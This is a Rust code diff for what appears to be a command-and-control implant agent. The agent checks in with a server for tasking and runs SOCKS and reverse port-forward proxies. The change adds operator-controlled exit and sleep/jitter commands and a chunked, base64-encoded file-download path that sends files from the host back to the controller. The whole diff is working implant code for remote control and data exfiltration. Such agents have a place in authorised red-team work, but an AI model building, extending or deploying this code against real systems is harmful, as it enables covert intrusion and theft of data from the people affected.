@@ -2,11 +2,19 @@ use crate::{
     codec::{Codec, CodecError},
     commands,
     config::AgentConfig,
-    protocol::{Checkin, CheckinReply, GetTasking, TaskResponse, TaskingReply},
+    protocol::{Checkin, CheckinReply, Download, GetTasking, TaskResponse, TaskingReply},
     proxy::{RpfwdManager, SocksManager},
     transport::{self, Transport, TransportError},
 };
+use base64::{engine::general_purpose::STANDARD, Engine};
+use std::collections::HashMap;
 use std::{env, process, thread, time::Duration};
+
+const DOWNLOAD_CHUNK_SIZE: usize = 512_000;
+
+struct PendingDownload {
+    data: Vec<u8>,
+}
 
 #[derive(Debug)]
 pub enum AgentError {
@@ -34,6 +42,8 @@ pub struct Agent {
     responses: Vec<TaskResponse>,
     socks: SocksManager,
     rpfwd: RpfwdManager,
+    downloads: HashMap<String, PendingDownload>,
+    exiting: bool,
 }
 
 impl Agent {
@@ -48,6 +58,8 @@ impl Agent {
             responses: Vec::new(),
             socks: SocksManager::new(),
             rpfwd: RpfwdManager::new(),
+            downloads: HashMap::new(),
+            exiting: false,
         })
     }
 
@@ -61,6 +73,9 @@ impl Agent {
                 Err(_error) => {
                     crate::diagnostic!("tasking cycle failed: {_error:?}");
                 }
+            }
+            if self.exiting && self.responses.is_empty() {
+                return Ok(());
             }
             thread::sleep(self.config.sleep_duration());
         }
@@ -111,11 +126,117 @@ impl Agent {
             .exchange(&outbound, Duration::from_secs(30))?;
         crate::diagnostic!("received tasking bytes={}", inbound.len());
         let (_, reply): (_, TaskingReply) = self.codec.decode(&inbound)?;
+        self.handle_response_acks(reply.responses);
         self.socks.ingest(reply.socks);
         self.rpfwd.ingest(reply.rpfwd);
         for task in reply.tasks {
-            self.responses.push(commands::dispatch(task));
+            let result = commands::dispatch(task);
+            let task_id = result.response.task_id.clone();
+            match result.action {
+                commands::CommandAction::None => self.responses.push(result.response),
+                commands::CommandAction::Exit => {
+                    self.exiting = true;
+                    self.responses.push(result.response);
+                }
+                commands::CommandAction::Sleep { interval, jitter } => {
+                    self.config.interval_ms = interval.saturating_mul(1000);
+                    self.config.jitter_pct = jitter;
+                    self.responses.push(result.response);
+                }
+                commands::CommandAction::Rpfwd { start, port } => {
+                    let applied = if start {
+                        self.rpfwd.listen(port).map_err(|e| e.to_string())
+                    } else {
+                        self.rpfwd.stop(port);
+                        Ok(())
+                    };
+                    self.responses.push(match applied {
+                        Ok(()) => result.response,
+                        Err(error) => error_response(task_id, error),
+                    });
+                }
+                commands::CommandAction::Download { path, data } => {
+                    let total_chunks = data.len().max(1).div_ceil(DOWNLOAD_CHUNK_SIZE) as u32;
+                    self.downloads
+                        .insert(task_id.clone(), PendingDownload { data });
+                    self.responses.push(TaskResponse {
+                        task_id,
+                        completed: None,
+                        status: None,
+                        user_output: None,
+                        download: Some(Download {
+                            total_chunks: Some(total_chunks),
+                            full_path: Some(path.clone()),
+                            filename: std::path::Path::new(&path)
+                                .file_name()
+                                .map(|v| v.to_string_lossy().into_owned()),
+                            chunk_size: Some(DOWNLOAD_CHUNK_SIZE as u32),
+                            chunk_num: None,
+                            file_id: None,
+                            chunk_data: None,
+                        }),
+                    });
+                }
+            }
         }
         Ok(())
+    }
+
+    fn handle_response_acks(&mut self, acks: Vec<crate::protocol::ResponseAck>) {
+        for ack in acks {
+            if ack.status != "success" {
+                if self.downloads.remove(&ack.task_id).is_some() {
+                    self.responses.push(error_response(ack.task_id, ack.error));
+                }
+                continue;
+            }
+            let Some(download) = self.downloads.remove(&ack.task_id) else {
+                continue;
+            };
+            if ack.file_id.is_empty() {
+                self.responses.push(error_response(
+                    ack.task_id,
+                    "download registration returned no file id".into(),
+                ));
+                continue;
+            }
+            let chunks: Vec<&[u8]> = if download.data.is_empty() {
+                vec![&[]]
+            } else {
+                download.data.chunks(DOWNLOAD_CHUNK_SIZE).collect()
+            };
+            let last = chunks.len();
+            for (index, chunk) in chunks.into_iter().enumerate() {
+                self.responses.push(TaskResponse {
+                    task_id: ack.task_id.clone(),
+                    completed: Some(index + 1 == last),
+                    status: if index + 1 == last {
+                        Some("success".into())
+                    } else {
+                        None
+                    },
+                    user_output: None,
+                    download: Some(Download {
+                        total_chunks: None,
+                        full_path: None,
+                        filename: None,
+                        chunk_size: Some(DOWNLOAD_CHUNK_SIZE as u32),
+                        chunk_num: Some((index + 1) as u32),
+                        file_id: Some(ack.file_id.clone()),
+                        chunk_data: Some(STANDARD.encode(chunk)),
+                    }),
+                });
+            }
+        }
+    }
+}
+
+fn error_response(task_id: String, error: String) -> TaskResponse {
+    TaskResponse {
+        task_id,
+        completed: Some(true),
+        status: Some(format!("error: {error}")),
+        user_output: Some(error),
+        download: None,
     }
 }
